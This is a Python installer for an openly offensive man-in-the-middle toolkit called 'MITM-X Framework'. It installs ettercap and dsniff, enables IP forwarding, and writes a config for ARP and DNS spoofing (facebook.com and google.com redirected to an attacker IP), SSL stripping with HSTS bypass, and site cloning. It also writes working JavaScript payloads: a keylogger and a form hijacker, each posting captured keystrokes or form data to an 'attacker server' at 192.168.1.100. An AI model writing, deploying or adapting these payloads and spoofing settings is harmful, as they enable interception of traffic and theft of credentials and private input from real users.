#!/usr/bin/env python3
"""
MITM-X Framework Setup Script
Automatically installs dependencies and configures the system
"""

import os
import sys
import subprocess
import json
import platform
import logging

class MITMSetup:
    """
    Setup class for MITM-X Framework
    """
    
    def __init__(self):
        """
        Initialize setup
        """
        # Setup logging
        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
        self.logger = logging.getLogger(__name__)
        
        # Check if running on supported OS
        self.os_name = platform.system().lower()
        self.is_kali = self.check_kali_linux()
        
        # Required packages
        self.python_packages = [
            'scapy==2.5.0',
            'netfilterqueue==1.1.0',
            'dnslib==0.9.23',
            'flask==2.3.3',
            'beautifulsoup4==4.12.2',
            'requests==2.31.0',
            'mitmproxy==10.1.1',
            'websockets==11.0.3',
            'colorama==0.4.6',
            'psutil==5.9.5',
            'pycryptodome==3.18.0'
        ]
        
        self.system_packages = [
            'python3-dev',
            'python3-pip',
            'python3-netfilterqueue',
            'iptables',
            'iptables-persistent',
            'dsniff',
            'ettercap-text-only',
            'build-essential',
            'libnetfilter-queue-dev'
        ]
    
    def check_kali_linux(self):
        """
        Check if running on Kali Linux
        
        Returns:
            bool: True if Kali Linux
        """
        try:
            with open('/etc/os-release', 'r') as f:
                content = f.read().lower()
                return 'kali' in content
        except:
            return False
    
    def check_root_privileges(self):
        """
        Check if running with root privileges
        
        Returns:
            bool: True if root
        """
        return os.geteuid() == 0
    
    def run_command(self, command, shell=True):
        """
        Run system command
        
        Args:
            command (str/list): Command to run
            shell (bool): Use shell
            
        Returns:
            bool: True if successful
        """
        try:
            self.logger.info(f"Running: {command}")
            result = subprocess.run(command, shell=shell, capture_output=True, text=True)
            
            if result.returncode == 0:
                self.logger.info("Command executed successfully")
                return True
            else:
                self.logger.error(f"Command failed: {result.stderr}")
                return False
        except Exception as e:
            self.logger.error(f"Error running command: {e}")
            return False
    
    def update_system(self):
        """
        Update system packages
        
        Returns:
            bool: True if successful
        """
        self.logger.info("Updating system packages...")
        
        if self.os_name == 'linux':
            return self.run_command("apt update && apt upgrade -y")
        else:
            self.logger.warning("Automatic system update not supported on this OS")
            return True
    
    def install_system_packages(self):
        """
        Install required system packages
        
        Returns:
            bool: True if successful
        """
        self.logger.info("Installing system packages...")
        
        if self.os_name != 'linux':
            self.logger.warning("System package installation only supported on Linux")
            return True
        
        # Install packages one by one for better error handling
        for package in self.system_packages:
            success = self.run_command(f"apt install -y {package}")
            if not success:
                self.logger.warning(f"Failed to install {package}, continuing...")
        
        return True
    
    def install_python_packages(self):
        """
        Install required Python packages
        
        Returns:
            bool: True if successful
        """
        self.logger.info("Installing Python packages...")
        
        # Upgrade pip first
        self.run_command(f"{sys.executable} -m pip install --upgrade pip")
        
        # Install packages
        for package in self.python_packages:
            success = self.run_command(f"{sys.executable} -m pip install {package}")
            if not success:
                self.logger.warning(f"Failed to install {package}, continuing...")
        
        return True
    
    def setup_directories(self):
        """
        Create necessary directories
        
        Returns:
            bool: True if successful
        """
        self.logger.info("Setting up directories...")
        
        directories = [
            'logs',
            'cloned_sites',
            'payloads',
            'config'
        ]
        
        for directory in directories:
            try:
                os.makedirs(directory, exist_ok=True)
                self.logger.info(f"Created directory: {directory}")
            except Exception as e:
                self.logger.error(f"Error creating directory {directory}: {e}")
                return False
        
        return True
    
    def setup_ip_forwarding(self):
        """
        Enable IP forwarding
        
        Returns:
            bool: True if successful
        """
        self.logger.info("Enabling IP forwarding...")
        
        if self.os_name != 'linux':
            self.logger.warning("IP forwarding setup only supported on Linux")
            return True
        
        # Enable IP forwarding temporarily
        success1 = self.run_command("echo 1 > /proc/sys/net/ipv4/ip_forward")
        
        # Make it permanent
        try:
            with open('/etc/sysctl.conf', 'r') as f:
                content = f.read()
            
            if 'net.ipv4.ip_forward=1' not in content:
                with open('/etc/sysctl.conf', 'a') as f:
                    f.write('\n# Enable IP forwarding for MITM-X\nnet.ipv4.ip_forward=1\n')
                self.logger.info("IP forwarding enabled permanently")
        except Exception as e:
            self.logger.error(f"Error making IP forwarding permanent: {e}")
        
        return success1
    
    def create_default_payloads(self):
        """
        Create default payload files
        
        Returns:
            bool: True if successful
        """
        self.logger.info("Creating default payload files...")
        
        payloads = {
            'alert.js': 'alert("MITM-X: This page has been compromised!");',
            'keylogger.js': '''
var keys = [];
document.addEventListener('keypress', function(e) {
    keys.push(String.fromCharCode(e.which));
    if (keys.length > 50) {
        // Send keys to attacker server
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'http://192.168.1.100:8080/keys', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify({keys: keys.join('')}));
        keys = [];
    }
});
            ''',
            'form_hijacker.js': '''
document.addEventListener('DOMContentLoaded', function() {
    var forms = document.getElementsByTagName('form');
    for (var i = 0; i < forms.length; i++) {
        forms[i].addEventListener('submit', function(e) {
            var formData = new FormData(this);
            var data = {};
            for (var pair of formData.entries()) {
                data[pair[0]] = pair[1];
            }
            
            // Send form data to attacker server
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'http://192.168.1.100:8080/forms', true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify(data));
        });
    }
});
            '''
        }
        
        try:
            for filename, content in payloads.items():
                filepath = os.path.join('payloads', filename)
                with open(filepath, 'w') as f:
                    f.write(content)
                self.logger.info(f"Created payload: {filepath}")
            return True
        except Exception as e:
            self.logger.error(f"Error creating payloads: {e}")
            return False
    
    def create_config_file(self):
        """
        Create default configuration file
        
        Returns:
            bool: True if successful
        """
        self.logger.info("Creating configuration file...")
        
        config = {
            "interface": "eth0",
            "gateway": "192.168.1.1",
            "dns_server": "8.8.8.8",
            "dashboard_port": 5000,
            "proxy_port": 8080,
            "log_level": "INFO",
            "arp_spoof": {
                "enabled": False,
                "target_ip": "",
                "gateway_ip": "",
                "interface": "eth0"
            },
            "dns_spoof": {
                "enabled": False,
                "domains": {
                    "facebook.com": "192.168.1.100",
                    "google.com": "192.168.1.100"
                },
                "redirect_ip": "192.168.1.100"
            },
            "packet_sniffer": {
                "enabled": False,
                "interface": "eth0",
                "log_file": "logs/packets.log"
            },
            "ssl_strip": {
                "enabled": False,
                "port": 8080,
                "hsts_bypass": True
            },
            "payload_injector": {
                "enabled": False,
                "port": 8080,
                "payload_file": "payloads/alert.js"
            },
            "web_cloner": {
                "enabled": False,
                "output_dir": "cloned_sites/",
                "server_port": 8000
            },
            "dashboard": {
                "enabled": True,
                "port": 5000,
                "host": "0.0.0.0"
            }
        }
        
        try:
            with open('config/settings.json', 'w') as f:
                json.dump(config, f, indent=4)
            self.logger.info("Configuration file created")
            return True
        except Exception as e:
            self.logger.error(f"Error creating config file: {e}")
            return False
    
    def test_dependencies(self):
        """
        Test if all dependencies are working
        
        Returns:
            bool: True if all tests pass
        """
        self.logger.info("Testing dependencies...")
        
        tests = [
            ('scapy', 'from scapy.all import *'),
            ('requests', 'import requests'),
            ('beautifulsoup4', 'from bs4 import BeautifulSoup'),
            ('flask', 'from flask import Flask'),
            ('psutil', 'import psutil'),
        ]
        
        all_passed = True
        
        for name, import_test in tests:
            try:
                exec(import_test)
                self.logger.info(f"✓ {name} - OK")
            except ImportError as e:
                self.logger.error(f"✗ {name} - FAILED: {e}")
                all_passed = False
            except Exception as e:
                self.logger.warning(f"? {name} - WARNING: {e}")
        
        # Test Linux-specific packages
        if self.os_name == 'linux':
            linux_tests = [
                ('netfilterqueue', 'from netfilterqueue import NetfilterQueue'),
                ('dnslib', 'from dnslib import *'),
            ]
            
            for name, import_test in linux_tests:
                try:
                    exec(import_test)
                    self.logger.info(f"✓ {name} - OK")
                except ImportError as e:
                    self.logger.error(f"✗ {name} - FAILED: {e}")
                    all_passed = False
                except Exception as e:
                    self.logger.warning(f"? {name} - WARNING: {e}")
        
        return all_passed
    
    def run_setup(self):
        """
        Run complete setup process
        
        Returns:
            bool: True if setup successful
        """
        self.logger.info("Starting MITM-X Framework setup...")
        
        # Check root privileges
        if not self.check_root_privileges():
            self.logger.error("This setup script requires root privileges!")
            self.logger.info("Please run with: sudo python3 setup.py")
            return False
        
        # Display system info
        self.logger.info(f"Detected OS: {self.os_name}")
        if self.is_kali:
            self.logger.info("Kali Linux detected - full compatibility")
        else:
            self.logger.warning("Non-Kali system - some features may not work")
        
        # Run setup steps
        steps = [
            ("Setting up directories", self.setup_directories),
            ("Updating system", self.update_system),
            ("Installing system packages", self.install_system_packages),
            ("Installing Python packages", self.install_python_packages),
            ("Setting up IP forwarding", self.setup_ip_forwarding),
            ("Creating default payloads", self.create_default_payloads),
            ("Creating configuration", self.create_config_file),
            ("Testing dependencies", self.test_dependencies),
        ]
        
        for step_name, step_function in steps:
            self.logger.info(f"\n--- {step_name} ---")
            success = step_function()
            if not success:
                self.logger.error(f"Setup step failed: {step_name}")
                return False
        
        self.logger.info("\n=== MITM-X Framework Setup Complete ===")
        self.logger.info("You can now run the framework with: sudo python3 mitm_x.py")
        self.logger.info("Dashboard will be available at: http://localhost:5000")
        
        return True

def main():
    """
    Main function
    """
    print("MITM-X Framework Setup")
    print("======================")
    print()
    
    setup = MITMSetup()
    
    try:
        success = setup.run_setup()
        if success:
            print("\n✓ Setup completed successfully!")
            print("You can now start using MITM-X Framework.")
        else:
            print("\n✗ Setup failed!")
            print("Please check the error messages above and try again.")
            sys.exit(1)
    except KeyboardInterrupt:
        print("\nSetup interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\nUnexpected error during setup: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
